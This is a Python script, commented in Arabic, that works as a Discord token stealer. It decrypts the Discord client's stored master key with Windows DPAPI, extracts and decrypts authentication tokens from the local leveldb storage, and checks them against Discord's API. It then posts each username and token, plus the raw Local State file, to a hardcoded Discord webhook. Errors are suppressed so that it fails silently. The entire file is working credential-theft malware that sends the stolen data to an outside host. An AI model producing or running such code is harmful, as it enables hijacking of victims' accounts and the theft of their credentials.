import os, json, base64, requests, win32crypt
from Crypto.Cipher import AES

def infiltrate():
    # الرابط الخاص بك الذي طلبته
    webhook = "https://discordapp.com/api/webhooks/1285713861835489291/eyMAac8Kqlpb0E5ziVRVkzrcclXywD32nq80LFFhXzGRSmP72BHELCM2HdRKIXxhF-L3"
    
    # مسارات ملفات ديسكورد
    path = os.getenv('APPDATA') + r'\discord'
    l_state = path + r'\Local State'
    db_path = path + r'\Local Storage\leveldb'

    if not os.path.exists(l_state): return

    try:
        # استخراج المفتاح الرئيسي (Master Key)
        with open(l_state, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            mk = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        tokens = []
        # البحث في قواعد البيانات عن التوكنات المشفرة
        for file in os.listdir(db_path):
            if file.endswith((".ldb", ".log")):
                with open(os.path.join(db_path, file), "r", errors="ignore") as f:
                    for line in f.readlines():
                        if "dQw4w9WgXcQ:" in line:
                            for p in line.split("dQw4w9WgXcQ:"):
                                try:
                                    raw = base64.b64decode(p.split('"')[0])
                                    # فك التشفير باستخدام AES-GCM
                                    t = AES.new(mk, AES.MODE_GCM, raw[3:15]).decrypt(raw[15:])[:-16].decode()
                                    if t not in tokens: tokens.append(t)
                                except: pass

        # إرسال التوكنات ومعلومات الحساب للويب هوك
        for t in tokens:
            u_info = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t}).json()
            if 'username' in u_info:
                msg = {
                    "content": f"🎯 **TARGET CAPTURED:** `{u_info['username']}`\n🔑 **TOKEN:** `{t}`"
                }
                requests.post(webhook, json=msg)

        # إرسال ملف Local State كنسخة احتياطية
        with open(l_state, 'rb') as f:
            requests.post(webhook, files={'file': ('Local_State.json', f)})

    except:
        pass

if __name__ == "__main__":
    infiltrate()
